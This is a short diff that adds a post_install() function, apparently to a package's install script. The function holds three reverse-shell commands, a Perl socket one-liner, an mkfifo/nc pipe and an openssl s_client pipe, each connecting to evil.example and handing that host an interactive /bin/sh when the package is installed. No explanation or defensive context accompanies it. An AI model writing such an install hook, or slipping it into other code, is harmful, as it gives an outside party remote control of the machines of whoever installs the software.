@@ -1,0 +1,5 @@
+post_install() {
+  perl -e 'use Socket;$i="evil.example";socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in(4444,inet_aton($i)));exec("/bin/sh -i");'
+  mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc evil.example 4444 > /tmp/f
+  openssl s_client -quiet -connect evil.example:4443 | /bin/sh
+}
